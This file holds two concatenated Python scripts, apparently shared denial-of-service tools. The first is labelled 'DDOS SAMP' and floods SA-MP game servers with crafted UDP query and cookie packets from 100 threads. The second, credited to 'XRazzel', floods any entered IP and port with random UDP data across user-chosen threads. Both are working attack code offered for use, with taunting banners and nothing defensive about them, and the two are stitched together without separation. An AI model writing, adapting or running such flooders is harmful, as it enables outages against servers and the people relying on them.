import socket

import struct

import codecs,sys

import threading

import random

import time

import os

os.system("clear");

print

print "============================================"

print "|Author   : DiegoBot Official                    |"

print "|Name Tools : DDOS SAMP                  |"

print "|Github   : https://github.com/DiegoBotXD |"

print "|Youtube : youtube.com/c/DiegoBotOfficial            |"

print "|Note : CTRL+Z For Stop It.                |"

print "|==============================================="

print

ip = raw_input("IP Target : ")

port = input("Port       : ")

orgip =ip

xnxx = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p

                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c

                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i

                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r

                       codecs.decode("081e62da","hex_codec"), #cookie port 7796

                       codecs.decode("081e77da","hex_codec"),#cookie port 7777

                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771

                       codecs.decode("021efd40","hex_codec"),#cookie port 7784

                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem

                       ]

print("Menyerang IP : %s Dengan Port %s"%(orgip,port))

            

class MyThread(threading.Thread):

     def run(self):

         while True:

                sock = socket.socket(

                    socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP

                

                msg = xnxx[random.randrange(0,3)]

                     

                sock.sendto(msg, (ip, int(port)))

                

                

                if(int(port) == 7777):

                    sock.sendto(xnxx[5], (ip, int(port)))

                elif(int(port) == 7796):

                    sock.sendto(xnxx[4], (ip, int(port)))

                elif(int(port) == 7771):

                    sock.sendto(xnxx[6], (ip, int(port)))

                elif(int(port) == 7784):

                    sock.sendto(xnxx[7], (ip, int(port)))

                    

                

if __name__ == '__main__':

    try:

     for x in range(100):                                    

            mythread = MyThread()  

            mythread.start()                                  

            time.sleep(.1)    

    except(KeyboardInterrupt):

         os.system('cls' if os.name == 'nt' else 'clear')

         

         print('#########################################################################')

         print('DiegoBot')

         print('#########################################################################')

         print('\n\n')

         print('{}'.format(orgip))

         pass
import random
import socket
import threading
import os,sys

os.system("clear")
print('''
    Remake By : XC LORD
 __  ______                   _ 
 \ \/ /  _ \ __ _ ___________| |
  \  /| |_) / _` |_  /_  / _ \ |
  /  \|  _ < (_| |/ / / /  __/ |
 /_/\_\_| \_\__,_/___/___\___|_|
                                

''')
print("dont abuse")
print("Tools By XRazzel")
ip = str(input(" Target IP:"))
port = int(input(" Target Port:"))
choice = str(input("Serang gak (y/n):"))
times = int(input(" Packets :"))
threads = int(input(" Threads:"))

os.system("clear")
def run():
	data = random._urandom(900)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XRazzel Ni Dek !!!")
		except:
			print("[X] AMPUN BANG Tar Jebol!!!")

def run2():
	data = random._urandom(900)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XRazzel Ni Dek!!!")
		except:
			s.close()
			print("[X] AMPUN BANG Tar Jebol!!!")

def run3():
	data = random._urandom(16)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XRazzel Ni Dek !!!")
		except:
			s.close()
			print("[X] AMPUN BANG Tar Jebol!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run3)
		th.start()
